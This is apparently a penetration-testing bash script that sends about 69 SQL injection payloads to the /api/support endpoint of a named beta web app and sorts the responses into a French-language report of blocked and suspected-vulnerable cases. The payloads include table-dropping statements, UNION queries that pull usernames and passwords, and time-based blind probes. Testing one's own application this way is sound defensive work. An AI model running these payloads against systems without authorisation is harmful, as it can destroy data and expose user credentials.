#!/bin/bash

# Enhanced SQL Injection Testing Script for /api/support endpoint
# Usage: ./enhanced_sql_injection_test.sh
# Tests comprehensive SQL injection vulnerabilities on app.beta.v2.helloquitx.com/api/support

TARGET="https://app.beta.v2.helloquitx.com"
ENDPOINT="/api/support"
TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
OUTPUT_FILE="enhanced_sql_injection_test_${TIMESTAMP}.txt"

echo "=== ENHANCED SQL INJECTION TESTING ON /api/support ===" | tee $OUTPUT_FILE
echo "Date: $(date)" | tee -a $OUTPUT_FILE
echo "Target: $TARGET$ENDPOINT" | tee -a $OUTPUT_FILE
echo "Format: EMOJI / TEST# / HTTP_CODE / ERROR / DETAILS" | tee -a $OUTPUT_FILE
echo

# Check if target is accessible
echo "[0] Checking if $TARGET$ENDPOINT is accessible..." | tee -a $OUTPUT_FILE
response=$(curl -s -w "HTTP:%{http_code}" $TARGET$ENDPOINT 2>/dev/null)
http_code=$(echo "$response" | tail -1 | grep -o "HTTP:[0-9]*" | cut -d: -f2)
echo "Connectivity test - HTTP Code: $http_code" | tee -a $OUTPUT_FILE
echo

# Classic SQL Injection Payloads
echo "[1] Testing CLASSIC SQL INJECTION payloads..." | tee -a $OUTPUT_FILE

classic_sql_payloads=(
    '{"subject":"test\" OR 1=1 --","message":"test","email":"test@test.com"}'
    '{"subject":"test","message":"test\" OR 1=1 --","email":"test@test.com"}'
    '{"subject":"test","message":"test","email":"test@test.com\" OR 1=1 --"}'
    '{"subject":"test\"; DROP TABLE users; --","message":"test","email":"test@test.com"}'
    '{"subject":"test","message":"test\"; DROP TABLE users; --","email":"test@test.com"}'
    '{"subject":"test","message":"test","email":"test@test.com\"; DROP TABLE users; --"}'
    '{"subject":"test\" OR \"1\"=\"1","message":"test","email":"test1@test.com"}'
    '{"subject":"test","message":"test\" OR \"1\"=\"1","email":"test1@test.com"}'
    '{"subject":"test","message":"test","email":"test1@test.com\" OR \"1\"=\"1"}'
    '{"subject":"test\") OR (\"1\"=\"1","message":"test","email":"test@test.com"}'
    '{"subject":"test","message":"test\") OR (\"1\"=\"1","email":"test@test.com"}'
    '{"subject":"test","message":"test","email":"test@test.com\") OR (\"1\"=\"1"}'
)

echo "[2] Testing UNION-BASED SQL INJECTION payloads..." | tee -a $OUTPUT_FILE

union_sql_payloads=(
    '{"subject":"test\" UNION SELECT 1,2,3 --","message":"test","email":"test@test.com"}'
    '{"subject":"test","message":"test\" UNION SELECT 1,2,3 --","email":"test@test.com"}'
    '{"subject":"test","message":"test","email":"test@test.com\" UNION SELECT 1,2,3 --"}'
    '{"subject":"test\" UNION SELECT null,null,null --","message":"test","email":"test@test.com"}'
    '{"subject":"test","message":"test\" UNION SELECT null,null,null --","email":"test@test.com"}'
    '{"subject":"test","message":"test","email":"test@test.com\" UNION SELECT null,null,null --"}'
    '{"subject":"test\" UNION SELECT username,password FROM users --","message":"test","email":"test@test.com"}'
    '{"subject":"test","message":"test\" UNION SELECT username,password FROM users --","email":"test@test.com"}'
    '{"subject":"test","message":"test","email":"test@test.com\" UNION SELECT username,password FROM users --"}'
    '{"subject":"test\" UNION SELECT schema_name FROM information_schema.schemata --","message":"test","email":"test@test.com"}'
    '{"subject":"test","message":"test\" UNION SELECT table_name FROM information_schema.tables --","email":"test@test.com"}'
    '{"subject":"test","message":"test","email":"test@test.com\" UNION SELECT column_name FROM information_schema.columns --"}'
)

echo "[3] Testing BOOLEAN-BASED BLIND SQL INJECTION payloads..." | tee -a $OUTPUT_FILE

blind_sql_payloads=(
    '{"subject":"test\" AND 1=1 --","message":"test","email":"test@test.com"}'
    '{"subject":"test\" AND 1=2 --","message":"test","email":"test@test.com"}'
    '{"subject":"test","message":"test\" AND 1=1 --","email":"test@test.com"}'
    '{"subject":"test","message":"test\" AND 1=2 --","email":"test@test.com"}'
    '{"subject":"test","message":"test","email":"test@test.com\" AND 1=1 --"}'
    '{"subject":"test","message":"test","email":"test@test.com\" AND 1=2 --"}'
    '{"subject":"test\" AND (SELECT COUNT(*) FROM users) > 0 --","message":"test","email":"test@test.com"}'
    '{"subject":"test","message":"test\" AND (SELECT COUNT(*) FROM users) > 0 --","email":"test@test.com"}'
    '{"subject":"test","message":"test","email":"test@test.com\" AND (SELECT COUNT(*) FROM users) > 0 --"}'
    '{"subject":"test\" AND LENGTH(database()) > 5 --","message":"test","email":"test@test.com"}'
    '{"subject":"test","message":"test\" AND LENGTH(database()) > 5 --","email":"test@test.com"}'
    '{"subject":"test","message":"test","email":"test@test.com\" AND LENGTH(database()) > 5 --"}'
)

echo "[4] Testing TIME-BASED BLIND SQL INJECTION payloads..." | tee -a $OUTPUT_FILE

time_sql_payloads=(
    '{"subject":"test\" AND SLEEP(3) --","message":"test","email":"test@test.com"}'
    '{"subject":"test","message":"test\" AND SLEEP(3) --","email":"test@test.com"}'
    '{"subject":"test","message":"test","email":"test@test.com\" AND SLEEP(3) --"}'
    '{"subject":"test\"; WAITFOR DELAY \"00:00:03\" --","message":"test","email":"test@test.com"}'
    '{"subject":"test","message":"test\"; WAITFOR DELAY \"00:00:03\" --","email":"test@test.com"}'
    '{"subject":"test","message":"test","email":"test@test.com\"; WAITFOR DELAY \"00:00:03\" --"}'
    '{"subject":"test\" AND IF(1=1,SLEEP(3),0) --","message":"test","email":"test@test.com"}'
    '{"subject":"test","message":"test\" AND IF(1=1,SLEEP(3),0) --","email":"test@test.com"}'
    '{"subject":"test","message":"test","email":"test@test.com\" AND IF(1=1,SLEEP(3),0) --"}'
)

echo "[5] Testing ERROR-BASED SQL INJECTION payloads..." | tee -a $OUTPUT_FILE

error_sql_payloads=(
    '{"subject":"test\" AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e)) --","message":"test","email":"test@test.com"}'
    '{"subject":"test","message":"test\" AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e)) --","email":"test@test.com"}'
    '{"subject":"test","message":"test","email":"test@test.com\" AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e)) --"}'
    '{"subject":"test\" AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1) --","message":"test","email":"test@test.com"}'
    '{"subject":"test","message":"test\" AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1) --","email":"test@test.com"}'
    '{"subject":"test","message":"test","email":"test@test.com\" AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1) --"}'
)

echo "[6] Testing FILTER BYPASS SQL INJECTION payloads..." | tee -a $OUTPUT_FILE

bypass_sql_payloads=(
    '{"subject":"test\u0027 OR 1=1 --","message":"test","email":"test@test.com"}'
    '{"subject":"test","message":"test\u0027 OR 1=1 --","email":"test@test.com"}'
    '{"subject":"test","message":"test","email":"test@test.com\u0027 OR 1=1 --"}'
    '{"subject":"test%27 OR 1=1 --","message":"test","email":"test@test.com"}'
    '{"subject":"test","message":"test%27 OR 1=1 --","email":"test@test.com"}'
    '{"subject":"test","message":"test","email":"test@test.com%27 OR 1=1 --"}'
    '{"subject":"test/**/OR/**/1=1 --","message":"test","email":"test@test.com"}'
    '{"subject":"test","message":"test/**/OR/**/1=1 --","email":"test@test.com"}'
    '{"subject":"test","message":"test","email":"test@test.com/**/OR/**/1=1 --"}'
    '{"subject":"test\" OR 1=1#","message":"test","email":"test@test.com"}'
    '{"subject":"test","message":"test\" OR 1=1#","email":"test@test.com"}'
    '{"subject":"test","message":"test","email":"test@test.com\" OR 1=1#"}'
)

echo "[7] Testing DATABASE-SPECIFIC SQL INJECTION payloads..." | tee -a $OUTPUT_FILE

db_specific_sql_payloads=(
    '{"subject":"test\" AND (SELECT @@version) --","message":"test","email":"test@test.com"}'
    '{"subject":"test","message":"test\" AND (SELECT version()) --","email":"test@test.com"}'
    '{"subject":"test","message":"test","email":"test@test.com\" AND (SELECT sqlite_version()) --"}'
    '{"subject":"test\" AND (SELECT user()) --","message":"test","email":"test@test.com"}'
    '{"subject":"test","message":"test\" AND (SELECT current_user()) --","email":"test@test.com"}'
    '{"subject":"test","message":"test","email":"test@test.com\" AND (SELECT database()) --"}'
)

# Combine all payloads
all_payloads=("${classic_sql_payloads[@]}" "${union_sql_payloads[@]}" "${blind_sql_payloads[@]}" "${time_sql_payloads[@]}" "${error_sql_payloads[@]}" "${bypass_sql_payloads[@]}" "${db_specific_sql_payloads[@]}")

successful_sql=0
server_errors=0
blocked_payloads=0
total_payloads=${#all_payloads[@]}
results_summary=()

echo "Testing $total_payloads total SQL injection payloads..." | tee -a $OUTPUT_FILE
echo "========================================" | tee -a $OUTPUT_FILE

for i in "${!all_payloads[@]}"; do
    payload="${all_payloads[$i]}"
    payload_num=$((i+1))

    # Measure response time and capture response properly
    start_time=$(date +%s.%N)
    
    # Use a temporary file to capture response body separately from headers
    temp_response="/tmp/curl_response_$"
    temp_headers="/tmp/curl_headers_$"
    
    http_code=$(curl -s -X POST \
        -H "Content-Type: application/json" \
        -H "User-Agent: Mozilla/5.0 (compatible; SecurityTest/1.0)" \
        -d "$payload" \
        -w "%{http_code}" \
        -o "$temp_response" \
        -D "$temp_headers" \
        -m 10 \
        $TARGET$ENDPOINT 2>/dev/null)
    
    end_time=$(date +%s.%N)
    response_time=$(echo "$end_time - $start_time" | bc)
    
    # Read the response content
    content=""
    if [ -f "$temp_response" ]; then
        content=$(cat "$temp_response")
    fi
    
    # Clean up temp files
    rm -f "$temp_response" "$temp_headers"

    # Debug info
    echo "DEBUG Test $payload_num - HTTP: $http_code, Content: '$content'" >> "${OUTPUT_FILE}.debug"

    # Extract error and details from JSON response
    error_msg=""
    details_msg=""
    
    # Check if we have content
    if [ -z "$content" ]; then
        error_msg="(empty response)"
    else
        # Try to extract error field
        if echo "$content" | grep -q '"error"'; then
            error_msg=$(echo "$content" | sed -n 's/.*"error" *: *"\([^"]*\)".*/\1/p')
        fi
        
        # Try to extract details array
        if echo "$content" | grep -q '"details"'; then
            details_raw=$(echo "$content" | sed -n 's/.*"details" *: *\[\([^]]*\)\].*/\1/p')
            if [ -n "$details_raw" ]; then
                details_msg=$(echo "$details_raw" | sed 's/"//g' | sed 's/, */ | /g')
            fi
        fi
        
        # Try to extract message field (for other error types)
        if [ -z "$error_msg" ] && echo "$content" | grep -q '"message"'; then
            error_msg=$(echo "$content" | sed -n 's/.*"message" *: *"\([^"]*\)".*/\1/p')
        fi
        
        # If still no structured data, show raw content
        if [ -z "$error_msg" ] && [ -z "$details_msg" ]; then
            error_msg=$(echo "$content" | tr -d '\n\r' | cut -c1-80)
        fi
    fi

    # Determine emoji based on analysis
    emoji=""
    if (( $(echo "$response_time > 2.5" | bc -l) )); then
        emoji="🚨"
        successful_sql=$((successful_sql + 1))
    elif [ "$http_code" == "200" ]; then
        if echo "$content" | grep -qi "syntax.*error\|mysql\|postgresql\|oracle\|sqlite\|sql.*server\|database.*error"; then
            emoji="🚨"
            successful_sql=$((successful_sql + 1))
        elif echo "$content" | grep -qi "success.*true\|created\|submitted"; then
            emoji="⚠️"
            successful_sql=$((successful_sql + 1))
        else
            emoji="❓"
        fi
    elif [ "$http_code" == "400" ]; then
        if echo "$content" | grep -qi "security.*validation\|xss.*detected\|sql.*injection\|dangerous.*content"; then
            emoji="✅"
            blocked_payloads=$((blocked_payloads + 1))
        else
            emoji="✅"
            blocked_payloads=$((blocked_payloads + 1))
        fi
    elif [ "$http_code" == "403" ]; then
        emoji="✅"
        blocked_payloads=$((blocked_payloads + 1))
    elif [ "$http_code" == "500" ]; then
        emoji="🚨"
        server_errors=$((server_errors + 1))
        if echo "$content" | grep -qi "sql\|mysql\|postgres\|database"; then
            successful_sql=$((successful_sql + 1))
        fi
    elif [ "$http_code" == "404" ]; then
        emoji="❌"
    elif [ "$http_code" == "429" ]; then
        emoji="⚡"
        sleep 3
    else
        emoji="⚠️"
    fi

    # Format output based on available data
    if [ -n "$error_msg" ] && [ -n "$details_msg" ]; then
        echo "$emoji / $payload_num / $http_code / $error_msg / $details_msg" | tee -a $OUTPUT_FILE
    elif [ -n "$error_msg" ]; then
        echo "$emoji / $payload_num / $http_code / $error_msg" | tee -a $OUTPUT_FILE
    else
        echo "$emoji / $payload_num / $http_code / (no response data)" | tee -a $OUTPUT_FILE
    fi
    
    results_summary+=("$payload_num.$emoji")

    # Add delay to avoid rate limiting
    sleep 0.2
done

echo "========================================" | tee -a $OUTPUT_FILE
echo
echo "📊 RÉSUMÉ RAPIDE DES TESTS:" | tee -a $OUTPUT_FILE
echo "$(printf '%s ' "${results_summary[@]}")" | tee -a $OUTPUT_FILE
echo | tee -a $OUTPUT_FILE

echo "🔍 LÉGENDE:" | tee -a $OUTPUT_FILE
echo "✅ = Sécurisé (validation fonctionnelle)" | tee -a $OUTPUT_FILE
echo "⚠️ = Attention (payload accepté)" | tee -a $OUTPUT_FILE
echo "🚨 = Vulnérabilité critique détectée" | tee -a $OUTPUT_FILE
echo "❌ = Erreur technique" | tee -a $OUTPUT_FILE
echo "❓ = À analyser manuellement" | tee -a $OUTPUT_FILE
echo "⚡ = Rate limiting actif" | tee -a $OUTPUT_FILE
echo | tee -a $OUTPUT_FILE

echo "📈 STATISTIQUES:" | tee -a $OUTPUT_FILE
echo "- Total payloads testés: $total_payloads" | tee -a $OUTPUT_FILE
echo "- Vulnérabilités détectées: $successful_sql" | tee -a $OUTPUT_FILE
echo "- Payloads bloqués: $blocked_payloads" | tee -a $OUTPUT_FILE
echo "- Erreurs serveur: $server_errors" | tee -a $OUTPUT_FILE
echo "📋 Rapport sauvegardé: $OUTPUT_FILE" | tee -a $OUTPUT_FILE

if [ "$successful_sql" -gt 0 ]; then
    echo | tee -a $OUTPUT_FILE
    echo "🚨 ALERTE: $successful_sql vulnérabilité(s) SQL détectée(s)!" | tee -a $OUTPUT_FILE
else
    echo | tee -a $OUTPUT_FILE
    echo "✅ Aucune vulnérabilité SQL critique détectée dans ces tests." | tee -a $OUTPUT_FILE
fi

echo "=============================================="